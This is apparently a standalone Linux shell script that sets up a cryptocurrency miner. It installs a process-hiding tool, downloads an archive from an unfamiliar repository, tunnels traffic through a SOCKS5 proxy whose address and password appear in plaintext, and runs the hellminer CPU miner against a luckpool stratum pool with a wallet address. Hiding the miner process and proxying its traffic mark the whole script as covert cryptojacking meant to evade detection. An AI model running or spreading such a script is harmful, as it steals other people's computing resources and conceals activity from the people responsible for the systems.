apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/denisule54/why/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 209.127.191.180:9279

socks5_username = zrgzxpoe

socks5_password = 0va1rd1mo7nk

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz

tar xf hellminer_cpu_linux.tar.gz

ph add hellminer

./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRtiCkRWjg1VpKtieBvsTD2tnUvNBswvga.dsX24 -p x --cpu 40
